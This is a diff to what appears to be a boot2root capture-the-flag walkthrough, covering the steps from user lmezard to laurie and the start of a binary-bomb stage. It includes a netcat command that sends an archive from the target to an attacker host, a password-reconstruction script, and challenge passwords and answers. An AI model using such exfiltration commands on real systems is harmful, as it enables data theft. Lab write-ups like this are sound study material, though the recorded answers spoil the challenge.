@@ -150,3 +150,76 @@ Password: G!@M6f4Eatau{sF"
 
 ![](assets/11.png)
 
+**lmezard -> laurie**
+
+Exfiltrated tar archive `fun` to our machine and extracted it
+
+```
+attack$ nc -lnp 9000 > loot/fun
+target$ cat fun | nc 192.168.0.5 9000
+attack$ tar xf fun
+```
+The extracted folder `ft_fun` contained a lot of files with the extension `pcap`, one of these files contained the following `main()`
+
+```c
+int main() {
+        printf("M");
+        printf("Y");
+        printf(" ");
+        printf("P");
+        printf("A");
+        printf("S");
+        printf("S");
+        printf("W");
+        printf("O");
+        printf("R");
+        printf("D");
+        printf(" ");
+        printf("I");
+        printf("S");
+        printf(":");
+        printf(" ");
+        printf("%c",getme1());
+        printf("%c",getme2());
+        printf("%c",getme3());
+        printf("%c",getme4());
+        printf("%c",getme5());
+        printf("%c",getme6());
+        printf("%c",getme7());
+        printf("%c",getme8());
+        printf("%c",getme9());
+        printf("%c",getme10());
+        printf("%c",getme11());
+        printf("%c",getme12());
+        printf("\n");
+        printf("Now SHA-256 it and submit");
+}
+```
+
+Extracted the password for `laurie` using this script
+
+```bash
+#!/bin/bash
+
+for i in `seq 1 3`
+do
+        for f in `ls loot/ft_fun/*.pcap`
+        do
+                cat $f
+                echo " $f"
+        done | egrep "file[0-9]{$i}\s" | sort | cut -d ' ' -f2 | xargs cat | egrep -o 'return.*'
+done | cut -d "'" -f 2 | tr -d '\n' | sha256sum
+```
+
+Logged in as `laurie` using SSH with the password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+
+**laurie -> thor**
+
+reversing `bomb`
+
+phase_1: 'Public speaking is very easy.'
+phase_2: 1 2 6 24 120 720
+phase_3: 
+phase_4: 
+phase_5: 
+phase_6: 
